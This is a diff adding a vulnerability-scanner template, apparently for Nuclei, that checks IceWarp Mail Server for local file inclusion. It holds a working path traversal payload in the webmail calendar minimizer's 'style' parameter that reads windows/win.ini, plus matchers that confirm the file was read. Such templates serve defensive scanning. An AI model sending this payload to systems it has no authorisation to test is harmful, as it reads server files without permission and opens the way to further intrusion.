@@ -1,0 +1,21 @@
+id: icewarp-mail-server-fileread
+info:
+  name: Icewarp Mail Server Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/-.._._.--.._rand/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
